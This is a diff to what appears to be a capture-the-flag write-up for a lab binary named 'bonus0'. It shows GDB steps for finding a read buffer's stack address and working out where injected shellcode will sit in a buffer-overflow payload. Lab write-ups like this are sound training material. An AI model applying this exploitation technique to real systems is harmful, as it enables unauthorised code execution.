@@ -27,20 +27,20 @@ second string: 9 padding + adress of shellcode + shellcode
 We still need to find the adress of our shellcode.
 As it is on the read buffer, it's adress is the adress of the buffer + 9 + 4 (padding + adress)
 
-To find the adress of the buffer we break just before the read instruction and we examine the stack to see the arguments passed to instruction passed to it:
+To find the adress of the buffer we break just before the read instruction and we examine the stack to see the arguments passed to it:
 
 gdb /home/user/bonus0/bonus0
-unset env LINES
-unset env COLUMNS
-b *0x080484e1
-r
-x/2a $esp
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+(gdb) b *0x080484e1
+(gdb) r
+(gdb) x/2a $esp
 0xbfffe670:	0x0 0xbfffe6b0
 
 The adress is 0xbfffe6b0, let's verify it:
-ni
+(gdb) ni
 type: aaaabbbb
-x/s 0xbfffe6b0
+(gdb) x/s 0xbfffe6b0
 0xbfffe6b0:	 "aaaabbbb\n"
 
 0xbfffe6b0 + 13 = 0xbfffe6bd
